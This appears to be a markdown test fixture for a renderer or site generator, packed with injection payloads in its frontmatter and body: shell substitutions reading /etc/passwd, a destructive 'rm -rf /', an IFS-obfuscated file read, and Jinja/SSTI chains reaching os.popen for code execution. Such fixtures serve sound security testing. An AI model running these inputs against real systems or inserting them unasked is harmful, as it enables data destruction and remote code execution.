---
title: $(whoami)
date: 2024-01-01
author: `id`
custom: |
  $(cat /etc/passwd)
---

# Command Injection Tests

## Shell Metacharacters

`$(whoami)`
`$(id)`
`$(cat /etc/passwd)`
`\`id\``

; ls -la
| cat /etc/passwd
&& rm -rf /
|| echo pwned

$(touch /tmp/pwned)
`touch /tmp/pwned`
${IFS}cat${IFS}/etc/passwd

## Template Injection

{{ config }}
{{ self.__class__.__mro__ }}
${7*7}
#{7*7}
<%= system("id") %>
{{constructor.constructor('return this')()}}

## SSTI Payloads

{% for i in range(10) %}{{ i }}{% endfor %}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ config.items() }}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

## Environment Variables

$HOME
$PATH
${HOME}
%USERPROFILE%
%PATH%
